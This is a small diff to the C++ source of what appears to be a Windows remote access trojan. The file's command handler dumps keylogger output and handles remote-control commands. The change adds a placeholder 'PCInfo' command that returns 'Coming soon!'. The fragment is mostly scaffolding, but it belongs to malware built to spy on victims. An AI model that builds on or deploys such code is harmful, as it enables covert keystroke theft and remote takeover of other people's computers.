@@ -1,4 +1,5 @@
 #include "general.h"
+#include "PCInfo.h"
 #include <process.h>
 
 std::string General::currentPath;			//current path of executable
@@ -8,10 +9,13 @@ bool General::installing;			//bool - defines whether the file is currently being
 									//instead of proceeding to the main loop)
 LPTSTR General::lpArguments;
 
+PCInfo a;
+
 
 bool General::init()	//startup of program
 {
 	//VARIABLE SETUP
+	
 	currentPath = getCurrentPath();
 	installFolder = getInstallFolder();
 	installPath = getInstallPath(installFolder);
@@ -282,6 +286,12 @@ std::string General::processCommand(std::string command)
 	{
 
 		return Keylogger::dumpKeys();
+	}
+	else if (command == "PCInfo")
+	{
+		
+		return "Coming soon!";
+
 	}
 
 	else if (processParameter(command, "remoteControl"))
